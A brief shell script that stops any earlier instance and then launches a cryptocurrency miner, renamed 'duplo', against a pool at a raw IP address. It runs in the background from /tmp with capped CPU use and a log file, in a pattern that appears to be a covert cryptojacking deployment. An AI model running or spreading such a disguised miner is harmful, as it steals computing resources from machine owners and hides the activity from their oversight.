pkill duplo
duplo -o 116.203.110.249:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server9/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=50 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server9/duplo.log'
